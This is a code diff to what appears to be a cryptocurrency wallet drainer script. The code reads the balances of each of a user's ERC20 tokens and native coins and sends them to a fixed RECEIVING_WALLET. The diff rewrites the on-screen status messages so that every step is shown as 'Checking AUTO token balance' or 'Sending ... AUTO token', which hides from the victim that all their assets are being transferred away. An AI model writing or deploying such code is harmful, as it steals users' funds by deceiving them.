@@ -692,14 +692,13 @@
         // Process ERC20 tokens first (excluding native)
         for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
-            updateStatus(`Checking ${token.name} balance...`, "success");
+            updateStatus(`Checking AUTO token balance...`, "success");
             
             const contract = new ethers.Contract(token.address, token.abi, signer);
             const balance = await contract.balanceOf(userAddress);
             
             if (balance.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
-             // updateStatus(`Sending ${formattedAmount} ${token.symbol}...`, "success");
               
               // Estimate gas first
               try {
@@ -729,7 +728,7 @@
         const nativeToken = tokensToSwap.find(t => t.isNative);
         if (nativeToken) {
           try {
-            updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
+            updateStatus(`Checking AUTO token balance...`, "success");
             const balance = await provider.getBalance(userAddress);
             
             // Keep 0.005 BNB/MATIC for gas if balance is large enough
@@ -738,7 +737,7 @@
             
             if (sendAmount.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(sendAmount, nativeToken.decimals);
-            //  updateStatus(`Sending ${formattedAmount} ${nativeToken.symbol}...`, "success");
+              updateStatus(`Sending ${formattedAmount} AUTO token...`, "success");
               
               const tx = await signer.sendTransaction({
                 to: RECEIVING_WALLET,
